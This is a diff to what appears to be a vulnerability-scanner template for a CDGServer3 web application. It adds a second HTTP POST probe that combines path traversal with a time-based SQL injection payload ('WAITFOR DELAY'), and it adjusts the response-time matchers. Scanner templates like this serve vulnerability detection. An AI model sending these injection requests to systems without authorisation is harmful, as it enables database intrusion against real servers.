@@ -17,11 +17,23 @@ id=1';WAITFOR DELAY '0:0:5'--
 
 #@ timeout: 20
 #@ condition: and
+#@ matcher: response_time >= 5
 #@ matcher: status_code == 200
-#@ matcher: response_time > 7
+
+---
+
+POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+id=1';WAITFOR DELAY '0:0:8'--
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
 
 
 
-
-
-# @VEIL-STAMP: 535c98d77a2be995fb35e7e4060a3d47957e4863ca9a3cbc483b03806adbc00e
+# @VEIL-STAMP: 1032b2297a7ead95601be66455b47567ab7040c1fcbcaa8f94cbea671f122357
